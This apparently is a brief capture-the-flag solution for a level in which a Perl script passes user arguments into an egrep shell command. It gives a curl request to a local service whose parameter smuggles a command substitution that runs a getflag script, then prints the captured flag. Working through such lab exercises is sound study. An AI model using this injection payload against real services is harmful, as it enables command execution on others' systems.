# the .perl program scans a file using two user provided arguments
# it scans the file using an egrep shell command, inserting modified user arguments inside
# we set one of these arguments to wildcard path to a shell script running getflag (A.SH)

# executes A.SH
curl localhost:4646?x="\"\$(/*/A.SH)\""
cat /tmp/salut # > g1qKMiRpXf53AWhDaU7FEkczr